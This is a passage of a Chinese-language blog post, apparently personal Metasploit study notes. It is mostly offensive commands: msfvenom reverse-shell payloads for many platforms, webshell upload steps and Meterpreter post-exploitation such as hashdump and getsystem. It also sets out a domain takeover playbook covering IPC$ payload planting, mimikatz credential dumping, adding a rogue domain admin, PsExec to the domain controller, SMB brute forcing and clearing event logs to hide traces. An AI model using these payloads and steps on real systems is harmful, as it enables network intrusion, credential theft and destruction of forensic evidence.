+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 中国菜刀，AntSword， Cknife， 冰蝎，Weevely(kali使用最多，但是只支持php)，msf也有自带的后门</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##### 1. Meterpreter 后门</span>
+</span></span><span class="line"><span class="cl">msf中有一个叫 php meterpreter 的payload，里哟你他可以创建具有Meterpreter功能的php webshell
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用msfvenom创建一个webshell</span>
+</span></span><span class="line"><span class="cl">msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.106 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1234</span> -f raw &gt; p.php
+</span></span><span class="line"><span class="cl"><span class="c1"># 上传webshell到目标机器</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 本机运行 msf multi-handler 开始监听</span>
+</span></span><span class="line"><span class="cl">use exploit/multi/handlers
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload php/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl"><span class="c1"># 访问webshell页面</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 获得反弹的 Metasploit Shell</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">##### 2. Aspx Meterpreter 后门</span>
+</span></span><span class="line"><span class="cl">msf下的 shell_reverse_tcp 的payload，可以创建多个版本的具有meterpreter功能的Shellcode
+</span></span><span class="line"><span class="cl">这里以aspx为例, 步骤和上面的那个大致相同
+</span></span><span class="line"><span class="cl">show payloads
+</span></span><span class="line"><span class="cl">use windows/shell_reverse_tcp
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> ...
+</span></span><span class="line"><span class="cl">save
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">generate -h  <span class="c1"># 查看帮助</span>
+</span></span><span class="line"><span class="cl">generate -t aspx  <span class="c1"># 生成aspx版本的ShellCode</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 保存内容到x.aspx，上传到服务器</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 本地设置监听</span>
+</span></span><span class="line"><span class="cl">use exploit/multi/handlers
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> payload windows/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl"><span class="c1"># 访问webshell页面</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 获得反弹的 Metasploit Shell</span>
+</span></span><span class="line"><span class="cl">后续就可以进行提权等操作了
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h4 id="msf基础命令">msf基础命令</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">search ms17  <span class="c1"># 查找</span>
+</span></span><span class="line"><span class="cl">use exploit/multi/handler    <span class="c1"># 使用</span>
+</span></span><span class="line"><span class="cl">info    <span class="c1"># 查看信息</span>
+</span></span><span class="line"><span class="cl">show expoits/payloads/options    <span class="c1"># 显示可用信息</span>
+</span></span><span class="line"><span class="cl">exploit /run    <span class="c1"># 执行</span>
+</span></span><span class="line"><span class="cl">back    <span class="c1"># 返回上一级</span>
+</span></span><span class="line"><span class="cl">exploit -j     <span class="c1"># 后台运行</span>
+</span></span><span class="line"><span class="cl">sessions    <span class="c1"># 查看当前可用会话</span>
+</span></span><span class="line"><span class="cl">session -i <span class="m">1</span>  <span class="c1"># 连接某个会话</span>
+</span></span><span class="line"><span class="cl">sessions -K    <span class="c1"># 杀死所有活跃会话</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="meterpreter命令">Meterpreter命令：</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">getuid    <span class="c1"># 查看用户名，从而查看当前会话具有的权限</span>
+</span></span><span class="line"><span class="cl">sysinfo    <span class="c1"># 列出主机信息</span>
+</span></span><span class="line"><span class="cl">getprivs    <span class="c1"># 尽可能多地获取目标主机上的特权</span>
+</span></span><span class="line"><span class="cl">getystem    <span class="c1"># 通过各种攻击向量来提升到系统用户权限</span>
+</span></span><span class="line"><span class="cl">hashdump    <span class="c1"># 导出目标主机中的口令哈希值</span>
+</span></span><span class="line"><span class="cl">screenshot    <span class="c1"># 屏幕截图</span>
+</span></span><span class="line"><span class="cl">background    <span class="c1"># 将当前的meterpreter shell转为后台执行</span>
+</span></span><span class="line"><span class="cl">quit    <span class="c1"># 关闭当前meterpreter会话，回到msf终端</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ps    <span class="c1"># 显示所有运行进程</span>
+</span></span><span class="line"><span class="cl">migrate PID    <span class="c1"># 迁移到制定的进程PID</span>
+</span></span><span class="line"><span class="cl">execute -f cmd.exe -i  <span class="c1"># 执行cmd.exe命令并进行交互</span>
+</span></span><span class="line"><span class="cl">shell    <span class="c1"># 以所有可用令牌来进行一个交互的shell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="msfvenom基础">msfvenom基础</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 参考：msf下的各种生成payload命令  http://www.cnblogs.com/backlion/p/6000544.html</span>
+</span></span><span class="line"><span class="cl"><span class="c1">### 二进制</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Linux</span>
+</span></span><span class="line"><span class="cl">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Windows 生成exe程序</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe
+</span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.0.105 <span class="nv">lport</span><span class="o">=</span><span class="m">4444</span> -f exe -o /var/www/html/payload.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Mac</span>
+</span></span><span class="line"><span class="cl">msfvenom -p osx/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### Web Payloads</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># PHP</span>
+</span></span><span class="line"><span class="cl">msfvenom -p php/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.php
+</span></span><span class="line"><span class="cl">cat shell.php <span class="p">|</span> pbcopy <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">&#39;&lt;?php &#39;</span> <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span> &gt; shell.php <span class="o">&amp;&amp;</span> pbpaste &gt;&gt; shell.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># ASP</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># JSP</span>
+</span></span><span class="line"><span class="cl">msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># WAR</span>
+</span></span><span class="line"><span class="cl">msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f war &gt; shell.war
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### Scripting Payloads</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Python</span>
+</span></span><span class="line"><span class="cl">msfvenom -p cmd/unix/reverse_python <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Bash</span>
+</span></span><span class="line"><span class="cl">msfvenom -p cmd/unix/reverse_bash <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Perl</span>
+</span></span><span class="line"><span class="cl">msfvenom -p cmd/unix/reverse_perl <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### Shellcode:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Linux Based Shellcode</span>
+</span></span><span class="line"><span class="cl">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f &lt;language&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Windows Based Shellcode</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f &lt;language&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Mac Based Shellcode</span>
+</span></span><span class="line"><span class="cl">msfvenom -p osx/x86/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f &lt;language&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### Handler</span>
+</span></span><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> PAYLOAD &lt;Payload name&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LHOST &lt;LHOST value&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> LPORT &lt;LPORT value&gt;
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> ExitOnSession <span class="nb">false</span>
+</span></span><span class="line"><span class="cl">exploit -j -z
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="反弹shell">反弹Shell</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">### 第一种(这个监听更综合一点)： use exploit/multi/hander</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1.msfvenom生成程序</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.使用handler执行exp</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3.在目标机器运行msfvenom生成程序</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 4.返回session</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">### 第二种： use exploit/multi/script/web_delivery</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1.使用web_delivery返回脚本执行并加载exp</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.在目标机器运行脚本</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 3.返回session</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Note: 这里要使用的payload与上面使用生成器生成的名字要一致</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<h2 id="一些小思路">一些小思路</h2>
+<h4 id="信息搜集">信息搜集</h4>
+<p>当拿下第一天内网主机的权限(提权不了时)，就要以此服务器为跳板攻击其他服务器</p>
+<p>先进行网络/用户组/DC等的收集</p>
+<h6 id="获取另外一台服务器权限">获取另外一台服务器权限</h6>
+<p><strong>若权限不够导致不能直接攻击域服务器</strong></p>
+<ul>
+<li>使用meterpreter当前拥有的权限添加到内网路由，进行弱口令扫描</li>
+<li>用Powershell对内网进行扫描</li>
+<li>架设Socks4a, 然后socks会自动进行内网扫描</li>
+<li>利用当前权限进行内网IPC$渗透</li>
+<li>其他</li>
+</ul>
+<p>通过分析，我们输入<code>net view</code>, 发现列举的机器选择一个和我们机器名相似的服务器试，成功率一般很高<code>net use \\WIN7_TEST2\c$</code></p>
+<p>使用经典的<code>IPC$入侵</code>（通过win默认启动的ipc共享来获得计算机控制权）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net use <span class="se">\1</span>92.168.0.112<span class="se">\i</span>pc$   <span class="c1"># 连接这个ip的ipc共享</span>
+</span></span><span class="line"><span class="cl">copy srv.exe <span class="se">\1</span>92.168.0.112<span class="se">\i</span>pc$  <span class="c1"># 复制srv(免杀的payload)到目标</span>
+</span></span><span class="line"><span class="cl">net <span class="nb">time</span> <span class="se">\1</span>92.168.0.112  <span class="c1"># 查看时间</span>
+</span></span><span class="line"><span class="cl">at <span class="se">\1</span>92.168.0.112 18:18 srv.exe    <span class="c1"># 用at命令在18点18分启动srv.exe (这里设置的时间要比主机时间快)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 如果没有 at命令，试试新的计划任务命令： schtask </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 回到msf的handler进行监听，到时间会反弹shell</span>
+</span></span><span class="line"><span class="cl">然后进入这个新的主机，查看包括权限在内的信息, 也可以mimikatz抓密码: run /post/windows/gather/mimikatz
+</span></span><span class="line"><span class="cl">也可以上传对应位数的mimikatz到该主机 upload /home/x64.exe c:<span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>shell    <span class="c1"># 进入到目标的shell，再执行</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="powershell寻找域管在线服务器">Powershell寻找域管在线服务器</h4>
+<p>使用<code>PowerView</code>脚本的<code>Invoke-User Hunter</code>上传到目标机器，然后执行<code>Invoke-UserHunter</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">powershell.exe -exec bypass -Command <span class="s2">&#34;&amp;{Import-Module .powerview.ps1;Invoke-UserHunter}&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>找到域管理员当前在线登录的主机后，入侵该主机，然后把它迁移到域管理员登录所在的进程，这样就有了域管的理的权限</p>
+<h4 id="获取域管权限">获取域管权限</h4>
+<p>渗透域控</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 先尝试</span>
+</span></span><span class="line"><span class="cl">getsystem
+</span></span><span class="line"><span class="cl">getuid  <span class="c1">#查看当前用户，因为之前知道这账户的域管理员</span>
+</span></span><span class="line"><span class="cl">ps    <span class="c1"># 找到域管理所在进程</span>
+</span></span><span class="line"><span class="cl">migrate <span class="m">30560</span> <span class="c1"># 迁移进程过去(也可以用msf中窃取令牌的功能)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 查看主域控的IP</span>
+</span></span><span class="line"><span class="cl">shell    <span class="c1"># 先进去cmd</span>
+</span></span><span class="line"><span class="cl">net <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用IPC$入侵来返回一个域控的meterpreter shell(操作见上面的步骤)</span>
+</span></span><span class="line"><span class="cl">net user <span class="nb">test</span> test123 /ad /domain <span class="c1"># 添加域管理员</span>
+</span></span><span class="line"><span class="cl">net group <span class="s2">&#34;domain admins&#34;</span> /domain  <span class="c1">#查看域管理员是否添加成功</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="登录域控">登录域控</h4>
+<p>下面要登录域控，抓取hash</p>
+<p>常见的登录域控的方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">- 利用IPC上传AT<span class="p">&amp;</span>Achtasks远程执行命令
+</span></span><span class="line"><span class="cl">- 利用端口转发或Socks登录DC的3389
+</span></span><span class="line"><span class="cl">- 登录对方内网一台主机使用PsTools工具包中的PsExec来反弹shell
+</span></span><span class="line"><span class="cl">- 使用msf下的PsExec，psexec_psh, Impacket psexec, pth-winexe, Empire Invoke-Psexec等PsExec类工具反弹shell
+</span></span><span class="line"><span class="cl">- 使用msf下的smb_login反弹shell
+</span></span><span class="line"><span class="cl">- 使用WMI来进行攻击
+</span></span><span class="line"><span class="cl">- 使用PsRemoting posershel远程执行命令
+</span></span><span class="line"><span class="cl">- 其他
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最常见的是msf下的PsEcex反弹meterpreter(1.msf下的PsEcex模块   2.cuestom模块,建议使用Veil之类的工具来生成免杀的payload)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">use /exploit/windows/smb/psexec
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> smbuser <span class="nb">test</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> smbpass test123
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> smbdomain HACKER
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> rhost 192.168.0.111
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl"><span class="c1"># 获得反弹的meterpreter shell之后，先迁移进程，查看DC的系统系统和sesssion控制图</span>
+</span></span><span class="line"><span class="cl">ps
+</span></span><span class="line"><span class="cl">migrate <span class="m">2166</span>
+</span></span><span class="line"><span class="cl">getuid
+</span></span><span class="line"><span class="cl">sysinfo
+</span></span><span class="line"><span class="cl">sessions    <span class="c1"># 查看我们获取的sessions</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 抓hash方法：</span>
+</span></span><span class="line"><span class="cl">- msf自带的hashdump<span class="o">(</span>有system权限才可以<span class="o">)</span>或smart_dump模块导出用户的Hash
+</span></span><span class="line"><span class="cl">- 使用PowerShell的相应模块导出hash
+</span></span><span class="line"><span class="cl">- 使用WCE、Mimikatz等工具
+</span></span><span class="line"><span class="cl">- 其他
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="smb爆破内网">SMB爆破内网</h4>
+<p>有了DC的密码，接下来只需快速在内网扩大控制权限</p>
+<ul>
+<li>利用当前获取的DC的账户密码，对整个域控的IP短进行扫描</li>
+<li>使用SMB下的smb_login模块</li>
+<li>端口转发或socks代理进内网</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## 先在msf添加路由，然后使用smb_login模块Huo psexec_Scanner模块进行爆破</span>
+</span></span><span class="line"><span class="cl">background
+</span></span><span class="line"><span class="cl">route add 192.168.0.115 255.255.255.0  <span class="m">2</span>    <span class="c1"># 目的是访问1192.168.0.115将通过meterpreter的会话 2 来访问：</span>
+</span></span><span class="line"><span class="cl">search smb_login
+</span></span><span class="line"><span class="cl">use auxiliary/scanner/smb/smb_login
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> ...
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 扫描内网</span>
+</span></span><span class="line"><span class="cl">creds  <span class="c1"># 然后获得大量内网服务器的密码，下面就可以畅游内网了</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或第三方软件(这里使用简单的第一种)</span>
+</span></span><span class="line"><span class="cl">portfwd add -l <span class="m">5555</span> -p <span class="m">3389</span> -r 127.0.0.1
+</span></span><span class="line"><span class="cl">background
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="清理日志">清理日志</h4>
+<p><strong>步骤</strong></p>
+<ul>
+<li>删除之前添加的域管理员的帐号</li>
+<li>删除所有在渗透中使用的工具</li>
+<li>删除应用程序、系统和安全日志</li>
+<li>关闭所有的Meterpreter连接</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">net user <span class="nb">test</span> /dels
+</span></span><span class="line"><span class="cl">clearev    <span class="c1"># 删除日志</span>
+</span></span><span class="line"><span class="cl">sessions
+</span></span><span class="line"><span class="cl">sessions -K <span class="c1"># 关闭所有msf连接</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/metasploit%E5%88%9D%E5%AD%A6-%E6%95%A3%E8%AE%B0/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/Metasploit%e5%88%9d%e5%ad%a6-%e6%95%a3%e8%ae%b0.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/metasploit/' class="post-tag">Metasploit</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/ms-16075%E6%8F%90%E6%9D%83windows-server-2008/" class="post-nav-item" rel="prev" title="ms-16075提权Windows Server 2008"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ms-16075提权Windows Server 2008</a>
